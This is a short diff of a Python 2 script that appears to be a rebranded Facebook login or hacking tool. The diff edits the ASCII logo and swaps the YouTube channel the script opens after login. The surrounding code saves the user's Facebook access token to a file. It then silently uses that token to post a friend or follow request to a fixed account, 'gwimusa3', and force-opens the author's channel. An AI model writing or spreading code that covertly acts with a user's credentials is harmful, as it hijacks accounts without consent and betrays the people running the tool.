@@ -48,7 +48,7 @@ def jalan(z):
 
 #### LOGO ####
 logo = """
-\033[0;39m▒▒▒▒▒▒▒▒Eso_hawlery▒▒▒▒▒▒▒▒
+\033[0;39m▒▒▒▒▒▒▒▒Eso_hawlery▒ ▒▒▒
 \033[0;39m▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
 \033[0;39m▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
 \033[0;39m░█▀█▀█░█▀██░█▀█░█▄█▄█░
@@ -139,7 +139,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCwq6RUSe8gO4fUlXxX1HUQA')
+				os.system('xdg-open https://www.youtube.com/channel/UCbcu_PQr2NsI9brqeUCS8tA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
